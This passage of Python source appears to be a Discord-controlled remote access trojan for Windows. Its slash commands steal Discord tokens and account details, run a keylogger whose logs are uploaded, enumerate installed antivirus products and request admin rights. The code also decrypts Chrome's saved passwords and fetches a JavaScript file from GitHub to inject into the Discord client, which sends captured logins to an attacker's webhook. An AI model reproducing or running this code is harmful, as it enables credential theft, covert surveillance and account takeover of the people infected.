            icon_path = "icon.ico",
            threaded = True,
        )

        await interaction.response.send_message("```Notification shown```")

        subprocess.Popen(fr"del {custom_tmp_path}\icon.ico")

#/voice
@tree.command(
    name="voice",
    description="text to speech",
    guild=discord.Object(id=1241310790888329257)
)
async def voice_command(interaction, text: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
            
        await interaction.response.send_message("```Told the message!```")


#/dcinfo
@tree.command(
    name="dcinfo",
    description="grab discord info (email, phone, 2fa/mfa info, nitro info, token)",
    guild=discord.Object(id=1241310790888329257)
)
async def dcinfo_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        dcInfo = get_token()
        embed = discord.Embed(colour=0xf100f5)

        embed.add_field(name="",
                value=f"{dcInfo}",
                inline=False)
        await interaction.response.send_message(embed=embed)
            



#/dcinject
@tree.command(
    name="dcinject",
    description="inject script into discord and get email and password if changed or logged in",
    guild=discord.Object(id=1241310790888329257)
)
async def dcinject_command(interaction, webhook_url: str):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(inject_into_discord(webhook_url)):
            await interaction.response.send_message("```Injected!```")
        else:
            await interaction.response.send_message("```could not inject```")


#/startkeylogger
@tree.command(
    name="startkeylogger",
    description="log all pressed keys",
    guild=discord.Object(id=1241310790888329257)
)
async def startkeylogger_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            await interaction.response.send_message("started key logger")
            def on_key_event(event):
                if event.event_type == keyboard.KEY_DOWN:
                    print(event.name)
                    with open(fr"{custom_tmp_path}\keylogger.txt", "a+") as file:
                        file.write(f"{event.name}\n")
                        file.close()
            keyboard.hook(on_key_event)
        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")

#/stopkeylogger
@tree.command(
    name="stopkeylogger",
    description="log all pressed keys",
    guild=discord.Object(id=1241310790888329257)
)
async def stopkeylogger_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        if(os.path.isdir(custom_tmp_path)):
            file = discord.File(fr"{custom_tmp_path}\keylogger.txt")
            await interaction.response.send_message("stopped key logger", file=file)
            keyboard.unhook_all()
            time.sleep(3)
            file.fp.close()
            time.sleep(1)
            subprocess.Popen(fr"del {custom_tmp_path}\keylogger.txt", shell=True)
        else:
            subprocess.Popen(fr"mkdir {custom_tmp_path}", shell=True)
            await interaction.response.send_message("```Error... try again```")


#/findantivirus
@tree.command(
    name="findantivirus",
    description="search for installed anti virus programs and get the folder",
    guild=discord.Object(id=1241310790888329257)
)
async def findantivirus_command(interaction):
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        antivirus_folders = find_antivirus_folders("C:\\Program Files")

        if antivirus_folders:
            for antivirus_name, folder_name in antivirus_folders.items():
                print(f"{antivirus_name}: {folder_name}")
                await interaction.response.send_message(f"```{antivirus_name}: {folder_name}```")

        else:
            await interaction.response.send_message(f"```no installed antivirus found```")



#/requestadmin
@tree.command(
    name="requestadmin",
    description="request admin",
    guild=discord.Object(id=1241310790888329257)
)
async def requestadmin_command(interaction):

    ASADMIN = 'asadmin'
    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        await interaction.response.send_message("```if accepted, it will open a new text channel (can last a few minutes)```")
        if ctypes.windll.shell32.IsUserAnAdmin() == 0:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)


#/admincheck
@tree.command(
    name="admincheck",
    description="check if you have admin rights",
    guild=discord.Object(id=1241310790888329257)
)
async def admincheck_command(interaction):

    global channel_count
    global channel_name
    channel = client.get_channel(interaction.channel_id)
    print("Listening to: " + channel.name)
    if channel.name != f"{channel_name.lower()}-{channel_count}":
        print(f"Message in: {channel_name.lower()}-{channel_count} and not in: " + channel.name)
        return
    else:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        await interaction.response.send_message(f"```{is_admin}```")


def find_antivirus_folders(base_folder):
    antivirus_names = [
        "Avast", "AVG", "Bitdefender", "Kaspersky", "McAfee", "Norton", "Sophos"
        "ESET", "Malwarebytes", "Avira", "Panda", "Trend Micro", "F-Secure", "McAfee", "Comodo", "Avira", 
        "BullGuard", "360 Total Security", "Ad-Aware", "Dr.Web", "G-Data", "Vipre", "ClamWin", "ZoneAlarm",
        "Cylance", "Webroot", "Cylance", "Palo Alto Networks", "Symantec", "SentinelOne", "CrowdStrike",
        "Emsisoft", "HitmanPro", "Fortinet", "Trend Micro", "Emsisoft", "FireEye", "Cylance", "ESET",
        "Zemana", "McAfee", "Windows Defender"
    ]
    antivirus_folders_dict = {}

    antivirus_folders_set = set()

    for folder in os.listdir(base_folder):
        full_path = os.path.join(base_folder, folder)

        if os.path.isdir(full_path):
            for antivirus_name in antivirus_names:
                if antivirus_name.lower() in folder.lower():
                    antivirus_folders_dict[antivirus_name] = folder

    return antivirus_folders_dict

    return antivirus_folders_set




def chrome_date_and_time(chrome_data): 
    # Chrome_data format is 'year-month-date  
    # hr:mins:seconds.milliseconds 
    # This will return datetime.datetime Object 
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data) 
  
  
def fetching_encryption_key(): 
    # Local_computer_directory_path will look  
    # like this below 
    # C: => Users => <Your_Name> => AppData => 
    # Local => Google => Chrome => User Data => 
    # Local State 
    local_computer_directory_path = os.path.join( 
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",  
      "User Data", "Local State") 
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f: 
        local_state_data = f.read() 
        local_state_data = json.loads(local_state_data) 
  
    # decoding the encryption key using base64 
    encryption_key = base64.b64decode( 
      local_state_data["os_crypt"]["encrypted_key"]) 
      
    # remove Windows Data Protection API (DPAPI) str 
    encryption_key = encryption_key[5:] 
      
    # return decrypted key 
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1] 
  
  
def password_decryption(password, encryption_key): 
    try: 
        iv = password[3:15] 
        password = password[15:] 
          
        # generate cipher 
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv) 
          
        # decrypt password 
        return cipher.decrypt(password)[:-16].decode() 
    except: 
          
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]) 
        except: 
            return "No Passwords"
  

local_app_data_path = os.environ['LOCALAPPDATA']

def inject_into_discord(webhook_url):

    discord_session_path = os.path.join(os.environ['APPDATA'], 'Discord')

    for file in os.listdir(discord_session_path):
        file_path = os.path.join(discord_session_path, file)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
        except Exception as e:
            print(f"Fehler beim Löschen der Datei {file_path}: {e}")

    print("Sitzungsdaten wurden gelöscht. Sie müssen sich erneut bei Discord anmelden.")

    path = fr'{local_app_data_path}\Discord\*\modules\discord_desktop_core-*\discord_desktop_core'

    matching_folders = glob.glob(path)

    url = 'https://raw.githubusercontent.com/Paloox/discordInjectionFile/main/injection.js'

    response = requests.get(url)


    file_content = response.text

    print(matching_folders)
    if matching_folders:

        target_folder = matching_folders[0]

        new_file_path = os.path.join(target_folder, 'index.js')

        print(new_file_path)
        with open(new_file_path, 'w') as file:

            file.write(file_content)

        search_text = "%WEBHOOK_URL_INJECT%"

        replace_text = webhook_url

        with open(new_file_path, 'r') as file:

            data = file.read()

            data = data.replace(search_text, replace_text)



        with open(new_file_path, 'w') as file:

            file.write(data)

    return True


def main() -> None:
    client.run(token=TOKEN)
if __name__ == '__main__':
    main()
